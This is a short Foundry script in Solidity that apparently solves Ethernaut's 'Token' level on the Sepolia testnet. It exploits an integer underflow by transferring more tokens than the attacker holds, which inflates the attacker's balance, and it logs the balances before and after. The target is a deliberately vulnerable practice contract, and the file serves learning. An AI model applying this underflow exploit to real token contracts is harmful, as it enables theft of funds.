// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../../src/ethernaut/05.sol";

// cast call --rpc-url $SEPOLIA_RPC_URL 0x94B998eC4CaF436D19abEeF774D832264f241eCD "balanceOf(address)(uint256)" <ADDRESS>
// forge script script/ethernaut/05.s.sol --rpc-url $SEPOLIA_RPC_URL --account PK1_SEPOLIA --sender <ADDRESS> --broadcast -vvvv

contract TokenAttackerScript is Script {
    Token public tokenContract = Token(0xB9f3b0D7D37e923faED24dFE4EC4f7e4B1ECd228);

    function run() public {
        vm.startBroadcast();
        console.log("Token balance attacker before transfer: ", tokenContract.balanceOf(msg.sender));

        tokenContract.transfer(address(0), 21);

        console.log("Token balance of attacker after transfer: ", tokenContract.balanceOf(address(msg.sender)));

        vm.stopBroadcast();
    }
}
